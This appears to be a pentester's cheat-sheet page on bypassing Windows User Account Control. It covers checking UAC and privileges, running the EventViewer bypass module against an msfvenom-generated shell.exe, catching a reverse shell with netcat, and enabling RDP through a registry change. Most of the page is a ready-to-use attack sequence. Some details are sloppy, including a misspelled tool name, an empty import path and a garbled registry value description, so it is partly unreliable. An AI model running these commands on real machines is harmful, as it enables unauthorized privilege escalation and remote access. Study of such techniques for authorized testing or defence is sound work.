# UAC Bypass

{% embed url="https://book.hacktricks.wiki/en/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control.html" %}

whoami/local admin? > Medium IL > UAC Bypass > High IL

Check UAC:&#x20;

{% code overflow="wrap" %}
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
```
{% endcode %}

*   If EnableUA is 0\*1 this means there is UAC.



Check privs:

```powershell
whoami /priv
```

* if you are in admin group and have medium integrity level then UAC is there.

{% embed url="https://github.com/CsEnox/EventViewer-UACBypass/blob/main/README.md" %}

Run UAC bypass:

1. create shell.exe with msfveon
2. import module

```
Import-Module ./
```

3. run bypass

```
Invoke-EventViewer C:\Windows\temp\shell.exe
```

4. Check netcat listener for connection

***

can try enabling RDP:

{% code overflow="wrap" %}
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
{% endcode %}
